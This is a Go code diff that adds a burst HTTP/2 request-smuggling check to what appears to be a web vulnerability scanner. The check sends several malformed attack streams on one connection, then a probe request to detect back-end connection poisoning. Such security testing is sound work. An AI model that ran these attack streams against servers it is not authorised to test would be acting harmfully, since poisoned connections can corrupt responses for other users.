@@ -486,6 +486,214 @@ func h2AttackAndProbe(
 	return attackResp, probeResp, nil
 }
 
+// h2BurstAttackAndProbe sends multiple attack requests (streams 1, 3, ..., 2*burstCount-1)
+// followed by a single probe GET on the last stream, all on the same H2 connection.
+//
+// The burst strategy mirrors the Java scanner's approach: sending N consecutive
+// attack requests increases the chance that the smuggled body contaminates the
+// back-end TCP connection. The probe (final stream) then checks if any of the
+// preceding attacks left poisoned data in the buffer.
+//
+// Returns the probe response from the final stream.
+func h2BurstAttackAndProbe(
+	target *url.URL,
+	method, path, host, body string,
+	extraHeaders map[string]string,
+	burstCount int,
+	cfg config.Config,
+) (probeResp *h2Response, err error) {
+	if burstCount < 1 {
+		burstCount = 1
+	}
+
+	// Merge cfg.ExtraHeaders / cfg.Cookies without overriding probe-specific keys.
+	if cfgExtra := request.ExtraH2Headers(cfg); len(cfgExtra) > 0 {
+		merged := make(map[string]string, len(cfgExtra)+len(extraHeaders))
+		for k, v := range cfgExtra {
+			merged[k] = v
+		}
+		for k, v := range extraHeaders {
+			merged[k] = v
+		}
+		extraHeaders = merged
+	}
+
+	addr := target.Hostname() + ":443"
+	if p := target.Port(); p != "" {
+		addr = target.Hostname() + ":" + p
+	}
+
+	tlsCfg := &tls.Config{
+		ServerName:         target.Hostname(),
+		InsecureSkipVerify: cfg.SkipTLSVerify, //nolint:gosec
+		NextProtos:         []string{"h2"},
+	}
+	dialer := &net.Dialer{Timeout: cfg.Timeout}
+	conn, err := tls.DialWithDialer(dialer, "tcp", addr, tlsCfg)
+	if err != nil {
+		return nil, fmt.Errorf("h2 dial: %w", err)
+	}
+	defer conn.Close()
+
+	if conn.ConnectionState().NegotiatedProtocol != "h2" {
+		return nil, fmt.Errorf("h2 not negotiated")
+	}
+
+	conn.SetDeadline(time.Now().Add(cfg.Timeout * 2)) //nolint:errcheck
+
+	if _, err := conn.Write([]byte(http2.ClientPreface)); err != nil {
+		return nil, err
+	}
+
+	framer := http2.NewFramer(conn, conn)
+	framer.AllowIllegalWrites = true
+	framer.AllowIllegalReads = true
+
+	if err := framer.WriteSettings(); err != nil {
+		return nil, err
+	}
+
+	// Resolve pseudo-header overrides for the attack streams.
+	pseudoMethod := method
+	pseudoPath := path
+	pseudoScheme := "https"
+	pseudoAuthority := host
+	regularHeaders := make(map[string]string)
+	for k, v := range extraHeaders {
+		switch k {
+		case ":method":
+			pseudoMethod = v
+		case ":path":
+			pseudoPath = v
+		case ":scheme":
+			pseudoScheme = v
+		case ":authority":
+			pseudoAuthority = v
+		default:
+			regularHeaders[k] = v
+		}
+	}
+
+	// Shared HPACK encoder — connection-scoped dynamic table.
+	var hbuf bytes.Buffer
+	enc := hpack.NewEncoder(&hbuf)
+
+	// CL value for attack streams.
+	clValue := fmt.Sprintf("%d", len(body))
+	suppressCL := false
+	if override, ok := regularHeaders["content-length"]; ok {
+		if override == "" {
+			suppressCL = true
+		} else {
+			clValue = override
+		}
+		delete(regularHeaders, "content-length")
+	}
+
+	// ── Send burstCount attack streams (odd IDs: 1, 3, 5, ...) ───────────
+	// H2 client-initiated streams use odd numbers.
+	probeStreamID := uint32(2*burstCount + 1) // probe gets the next odd ID after all attacks
+	for i := 0; i < burstCount; i++ {
+		streamID := uint32(2*i + 1)
+		hbuf.Reset()
+		enc.WriteField(hpack.HeaderField{Name: ":method", Value: pseudoMethod})
+		enc.WriteField(hpack.HeaderField{Name: ":path", Value: pseudoPath})
+		enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: pseudoScheme})
+		enc.WriteField(hpack.HeaderField{Name: ":authority", Value: pseudoAuthority})
+		enc.WriteField(hpack.HeaderField{Name: "content-type", Value: "application/x-www-form-urlencoded"})
+		if !suppressCL {
+			enc.WriteField(hpack.HeaderField{Name: "content-length", Value: clValue})
+		}
+		enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: request.UserAgent})
+		enc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: "identity"})
+		for k, v := range regularHeaders {
+			enc.WriteField(hpack.HeaderField{Name: k, Value: v})
+		}
+		if err := framer.WriteHeaders(http2.HeadersFrameParam{
+			StreamID:      streamID,
+			BlockFragment: hbuf.Bytes(),
+			EndStream:     false,
+			EndHeaders:    true,
+		}); err != nil {
+			return nil, err
+		}
+		if err := framer.WriteData(streamID, true, []byte(body)); err != nil {
+			return nil, err
+		}
+		dbg(cfg, "h2Burst: sent attack on stream %d", streamID)
+	}
+
+	// ── Send probe on the final stream (plain GET, no body) ──────────────
+	hbuf.Reset()
+	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
+	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
+	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
+	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
+	enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: request.UserAgent})
+	enc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: "identity"})
+	if err := framer.WriteHeaders(http2.HeadersFrameParam{
+		StreamID:      probeStreamID,
+		BlockFragment: hbuf.Bytes(),
+		EndStream:     true,
+		EndHeaders:    true,
+	}); err != nil {
+		return nil, err
+	}
+	dbg(cfg, "h2Burst: sent probe on stream %d (after %d attacks)", probeStreamID, burstCount)
+
+	// ── Read frames, only care about probe stream ────────────────────────
+	probeResp = &h2Response{}
+	hpackDec := hpack.NewDecoder(4096, nil)
+	var probeBuf bytes.Buffer
+	probeDone := false
+	deadline := time.Now().Add(cfg.Timeout)
+
+	for !probeDone && time.Now().Before(deadline) {
+		frame, err := framer.ReadFrame()
+		if err != nil {
+			break
+		}
+		switch f := frame.(type) {
+		case *http2.DataFrame:
+			if f.StreamID == probeStreamID {
+				probeBuf.Write(f.Data())
+				if f.StreamEnded() {
+					probeDone = true
+				}
+			}
+		case *http2.HeadersFrame:
+			if f.StreamID == probeStreamID {
+				if fields, decErr := hpackDec.DecodeFull(f.HeaderBlockFragment()); decErr == nil {
+					for _, hf := range fields {
+						probeResp.Headers = append(probeResp.Headers, hf)
+						if hf.Name == ":status" {
+							fmt.Sscanf(hf.Value, "%d", &probeResp.Status)
+						}
+					}
+				}
+				if f.StreamEnded() {
+					probeDone = true
+				}
+			}
+		case *http2.RSTStreamFrame:
+			if f.StreamID == probeStreamID {
+				probeDone = true
+			}
+		case *http2.GoAwayFrame:
+			probeDone = true
+		case *http2.SettingsFrame:
+			if !f.IsAck() {
+				framer.WriteSettingsAck() //nolint:errcheck
+			}
+		case *http2.WindowUpdateFrame:
+			// Acknowledge flow control — ignore
+		}
+	}
+
+	probeResp.Body = probeBuf.Bytes()
+	return probeResp, nil
+}
+
 // ─── H2 raw framing ──────────────────────────────────────────────────────────
 
 // h2Response holds the structured result of an H2 request, separating decoded
